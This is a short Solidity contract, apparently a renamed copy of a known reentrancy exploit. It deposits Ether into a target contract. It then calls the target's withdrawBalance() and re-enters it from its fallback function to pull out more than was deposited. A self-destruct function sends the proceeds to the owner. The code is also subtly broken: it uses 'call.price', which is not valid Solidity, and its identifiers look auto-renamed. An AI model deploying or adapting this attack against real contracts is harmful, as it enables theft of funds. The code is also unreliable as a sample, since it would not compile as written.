pragma solidity ^0.4.15;

contract VaultQuestrunner {
    bool public operationEnabled=false;
    address public goal_agreement;
    address public owner;

    function VaultQuestrunner() public{
        owner = msg.sender;
    }

    function cachePrize(address _goal_agreement) public payable{
        goal_agreement = _goal_agreement ;

        require(goal_agreement.call.price(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_handler() public{
        operationEnabled = true;


        require(goal_agreement.call(bytes4(sha3("withdrawBalance()"))));
    }

    function () public payable{

        if (operationEnabled){
            operationEnabled = false;
                require(goal_agreement.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function fetch_money(){
        suicide(owner);
    }

}